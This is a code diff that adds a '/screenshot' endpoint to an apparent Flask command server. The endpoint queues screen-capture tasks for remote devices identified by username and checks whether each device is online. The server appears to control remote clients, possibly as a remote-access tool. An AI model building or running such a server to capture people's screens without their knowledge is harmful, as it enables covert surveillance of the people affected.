@@ -16,6 +16,23 @@ file_path = []
 def ping():
     return "pong", 200
 
+@app.route('/screenshot', methods=['POST'])
+def send_file():
+    data = request.get_json()
+    global device_names
+    global device_timeStamps
+    global task_arr
+    global file_path
+    try:
+        if time.time() - device_timeStamps[device_names.index(data["username"])] >= 120:
+            return jsonify({"status":"current user not online"})
+        else:
+            task_arr[device_names.index(data["username"])] = "screenshot"
+            file_path[device_names.index(data["username"])] = "null"
+            return jsonify({"status":"passed command"})
+    except Exception as e:
+        return jsonify({"status" : "User not found"})
+
 
 @app.route('/get_data', methods=['POST'])
 def get_data():
